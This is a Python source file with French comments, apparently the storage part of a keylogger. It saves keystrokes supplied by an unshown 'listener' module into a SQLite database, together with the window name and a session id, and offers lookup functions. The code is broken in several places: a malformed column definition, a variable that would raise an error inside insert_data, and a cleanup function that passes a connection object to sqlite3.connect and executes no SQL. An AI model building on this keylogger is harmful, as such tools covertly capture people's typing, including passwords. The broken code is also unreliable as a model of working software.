import sqlite3
import uuid
from datetime import datetime
import listener
#test  
con = sqlite3.connect('keylogs.db')
cur = con.cursor()
key_data = listener.flush_buffer()
ts = listener.last_timestamp
window = "Window1" #temporaire a remplacer pars variable
buffer_empty = getattr(listener, "buffer_empty", False)
SESSION_ID = str(uuid.uuid4())[:8]
#___________________________________________________________creation de la table_____________________________________________
def create_table():
    cur.execute(""" CREATE TABLE IF NOT EXISTS keylogs(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT,
    key TEXT,
    window TEXT,
    session_id DEFAULT 'user_session
                ')
    """)
    con.commit()

#___________________________________________________________ insertion de données____________________________________________

def insert_data(timestamp, key, window, session_id):
    if buffer_empty:
        cur.execute("INSERT INTO keylogs(timestamp, key, window, session_id) VALUES (?, ?, ?, ?)", (timestamp, key, window, session_id))
        con.commit()
        buffer_empty = False #réinitialise le buffer_empty aprés insertion
    else:
        print("Buffer en cours d'execution, données non insérées dans la base de données.")
#____________________________________________________________affichage de toutes les données____________________________________________
def find_by_timestamp(timestamp1, timestamp2):#chercher par timestamp
    cur.execute("SELECT timestamp FROM keylogs WHERE timestamp BETWEEN ? AND ? ORDER BY timestamp", (timestamp1, timestamp2))
    raw1 = cur.fetchall()
    print(raw1)

def find_by_key(key):#chercher par key
    cur.execute("SELECT * FROM keylogs WHERE key = ? ORDER BY key", (key,))
    raw2 = cur.fetchall()
    print(raw2)

def find_by_window(window):#chercher par window
    cur.execute("SELECT * FROM keylogs WHERE window = ? ORDER BY window", (window,))
    raw3 = cur.fetchall()
    print(raw3)

def find_by_session_id(session_id):#chercher par session_id
    cur.execute("SELECT * FROM keylogs WHERE session_id = ? ORDER BY session_id", (session_id,))
    raw4 = cur.fetchall()
    print(raw4)

def find_by_id(id):#chercher par id
    cur.execute("SELECT * FROM keylogs WHERE id = ? ORDER BY id", (id,))
    raw5 = cur.fetchall()
    print(raw5)

#____________________________________________________________execution du code____________________________________________
create_table()
insert_data("2023-10-10 12:00:00", "a", "Window1", "Session1")


# netoyage

def clear_old(days=7):
    with sqlite3.connect(con) as conn:
        conn.execute(
            (f"-{days} days",)
        )
        conn.commit()